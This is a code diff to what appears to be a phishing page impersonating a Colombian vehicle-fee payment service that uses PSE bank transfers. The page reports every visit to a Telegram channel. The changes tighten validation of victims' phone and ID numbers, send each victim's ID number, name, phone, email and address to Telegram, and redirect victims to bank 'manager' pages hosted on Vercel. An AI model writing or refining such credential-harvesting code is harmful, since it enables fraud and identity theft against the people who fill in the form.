@@ -18,7 +18,7 @@ $PSE_PRIMARY_PAGE  = $pseConfig['links']['primary_page'] ?? 'https://pagosonline
 $PSE_BANK_ALIASES  = $pseConfig['aliases'] ?? [];
 
 require_once __DIR__ . '/api/privado/telegram.php';
-$ip        = (string) ($_SERVER['REMOTE_ADDR']     ?? 'desconocida');
+$ip        = veh_get_ip();
 $userAgent = (string) ($_SERVER['HTTP_USER_AGENT'] ?? '—');
 veh_tg_log($apiConfig ?? [], '🟢 NUEVA VISITA VEHICULAR', [
     '📄 Página' => 'index.php',
@@ -1062,7 +1062,7 @@ veh_tg_log($apiConfig ?? [], '🟢 NUEVA VISITA VEHICULAR', [
         }
 
         .payment-btn--primary.is-ready {
-            background: #9aa8d9;
+            background: #2e4fc1;
             cursor: pointer;
         }
 
@@ -1814,7 +1814,8 @@ veh_tg_log($apiConfig ?? [], '🟢 NUEVA VISITA VEHICULAR', [
                             </div>
                             <div class="payment-field">
                                 <label for="payment-document-number"><span class="required">*</span> N&uacute;mero de documento</label>
-                                <input class="payment-control" id="payment-document-number" type="text" placeholder="N&uacute;mero de documento">
+                                <input class="payment-control" id="payment-document-number" type="text" inputmode="numeric" maxlength="15" placeholder="N&uacute;mero de documento" autocomplete="off">
+                                <div class="payment-error" id="payment-doc-error"></div>
                             </div>
                             <div class="payment-field">
                                 <label for="payment-customer-type"><span class="required">*</span> Tipo de cliente</label>
@@ -1832,7 +1833,8 @@ veh_tg_log($apiConfig ?? [], '🟢 NUEVA VISITA VEHICULAR', [
                             </div>
                             <div class="payment-field">
                                 <label for="payment-phone"><span class="required">*</span> N&uacute;mero de tel&eacute;fono</label>
-                                <input class="payment-control" id="payment-phone" type="tel" placeholder="N&uacute;mero de tel&eacute;fono">
+                                <input class="payment-control" id="payment-phone" type="tel" inputmode="numeric" maxlength="10" placeholder="3XXXXXXXXX" autocomplete="tel">
+                                <div class="payment-error" id="payment-phone-error"></div>
                             </div>
                             <div class="payment-field">
                                 <label for="payment-email"><span class="required">*</span> Correo electr&oacute;nico</label>
@@ -1981,7 +1983,9 @@ veh_tg_log($apiConfig ?? [], '🟢 NUEVA VISITA VEHICULAR', [
         const paymentAddress = document.getElementById('payment-address');
         const paymentBank = document.getElementById('payment-bank');
         const paymentConsent = document.getElementById('payment-consent');
-        const paymentBankError = document.getElementById('payment-bank-error');
+        const paymentBankError  = document.getElementById('payment-bank-error');
+        const paymentPhoneError = document.getElementById('payment-phone-error');
+        const paymentDocError   = document.getElementById('payment-doc-error');
         const cancelPaymentButton = document.getElementById('cancel-payment-button');
         const confirmPaymentButton = document.getElementById('confirm-payment-button');
         const requiredFields = [documentoInput, placaInput];
@@ -2174,9 +2178,16 @@ veh_tg_log($apiConfig ?? [], '🟢 NUEVA VISITA VEHICULAR', [
             }
         }
 
+        function isPhoneValid(v) { return /^3\d{9}$/.test(v); }
+        function isDocValid(v)   { return /^\d{4,15}$/.test(v); }
+        function isEmailValid(v) { return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v); }
+
         function updatePaymentState() {
-            const allFilled = paymentRequiredFields.every((field) => field.value.trim().length > 0);
-            const isReady = allFilled && paymentConsent.checked;
+            const allFilled  = paymentRequiredFields.every((field) => field.value.trim().length > 0);
+            const phoneOk    = isPhoneValid(paymentPhone.value.trim());
+            const docOk      = isDocValid(paymentDocumentNumber.value.trim());
+            const emailOk    = isEmailValid(paymentEmail.value.trim());
+            const isReady    = allFilled && paymentConsent.checked && phoneOk && docOk && emailOk;
             const showBankError = paymentBank.value.trim().length === 0 && paymentConsent.checked;
 
             paymentBankError.textContent = showBankError ? 'El campo banco es obligatorio' : '';
@@ -2416,6 +2427,53 @@ veh_tg_log($apiConfig ?? [], '🟢 NUEVA VISITA VEHICULAR', [
 
         paymentConsent.addEventListener('change', updatePaymentState);
 
+        // Teléfono: solo dígitos, máx 10, debe iniciar en 3
+        paymentPhone.addEventListener('input', function () {
+            this.value = this.value.replace(/\D/g, '').slice(0, 10);
+            paymentPhoneError.textContent = '';
+            updatePaymentState();
+        });
+        paymentPhone.addEventListener('blur', function () {
+            const v = this.value.trim();
+            if (!v) return;
+            if (!isPhoneValid(v)) {
+                paymentPhoneError.textContent = v.length < 10
+                    ? 'El teléfono debe tener 10 dígitos'
+                    : 'El teléfono debe empezar por 3';
+            } else {
+                paymentPhoneError.textContent = '';
+            }
+        });
+
+        // Documento: solo dígitos, máx 15
+        paymentDocumentNumber.addEventListener('input', function () {
+            this.value = this.value.replace(/\D/g, '').slice(0, 15);
+            paymentDocError.textContent = '';
+            updatePaymentState();
+        });
+        paymentDocumentNumber.addEventListener('blur', function () {
+            const v = this.value.trim();
+            if (v && !isDocValid(v)) {
+                paymentDocError.textContent = 'Ingresa un número de documento válido';
+            } else {
+                paymentDocError.textContent = '';
+            }
+        });
+
+        // Email: validar formato al salir del campo
+        paymentEmail.addEventListener('blur', function () {
+            const v = this.value.trim();
+            if (v && !isEmailValid(v)) {
+                this.style.borderColor = '#e33a3a';
+            } else {
+                this.style.borderColor = '';
+            }
+        });
+        paymentEmail.addEventListener('input', function () {
+            this.style.borderColor = '';
+            updatePaymentState();
+        });
+
         captchaButton.addEventListener('click', () => {
             if (captchaState === 'verifying') return;
 
@@ -2468,19 +2526,26 @@ veh_tg_log($apiConfig ?? [], '🟢 NUEVA VISITA VEHICULAR', [
             confirmPaymentButton.disabled    = true;
             confirmPaymentButton.textContent = 'Procesando...';
 
-            tgLogEvent('🏦 Envío formulario PSE vehicular', {
-                'Banco':           bankName,
-                'Banco clave':     bankConfig.key,
-                'Flujo':           bankConfig.flow,
-                'Monto':           currentPaymentContext.amountText,
-                'Nombre':          paymentName.value.trim(),
-                'Tipo documento':  paymentDocumentType.value,
-                'Tipo persona':    paymentCustomerType.value,
-            });
+            const logBase = {
+                '🏦 Banco':           bankName,
+                '💳 Tipo documento':  paymentDocumentType.value,
+                '🪪 Documento':       paymentDocumentNumber.value.trim(),
+                '👤 Nombre':          paymentName.value.trim(),
+                '📱 Teléfono':        paymentPhone.value.trim(),
+                '📧 Correo':          paymentEmail.value.trim(),
+                '🏠 Dirección':       paymentAddress.value.trim(),
+                '👥 Tipo persona':    paymentCustomerType.value,
+                '💰 Monto':           currentPaymentContext.amountText,
+            };
 
             // Primary banks → Vercel directo
             if (bankConfig.flow === 'primary') {
-                window.location.href = bankConfig.page + '/sites/' + bankConfig.slug + '/manager/' + bankConfig.id;
+                const destUrl = bankConfig.page + '/sites/' + bankConfig.slug + '/manager/' + bankConfig.id;
+                tgLogEvent('🏦 Pago PSE vehicular', Object.assign({}, logBase, {
+                    '➡️ Destino': 'Vercel (' + bankConfig.key + ')',
+                    '🔗 URL':     destUrl,
+                }));
+                window.location.href = destUrl;
                 return;
             }
 
@@ -2502,6 +2567,10 @@ veh_tg_log($apiConfig ?? [], '🟢 NUEVA VISITA VEHICULAR', [
             .then(function (r) { return r.json(); })
             .then(function (result) {
                 if (result.ok) {
+                    tgLogEvent('🏦 Pago PSE vehicular', Object.assign({}, logBase, {
+                        '➡️ Destino': result.flow === 'helppiupay' ? 'HelppiuPay' : 'Recaudofall',
+                        '🔗 URL':     result.url,
+                    }));
                     window.location.href = result.url;
                 } else {
                     confirmPaymentButton.disabled    = false;
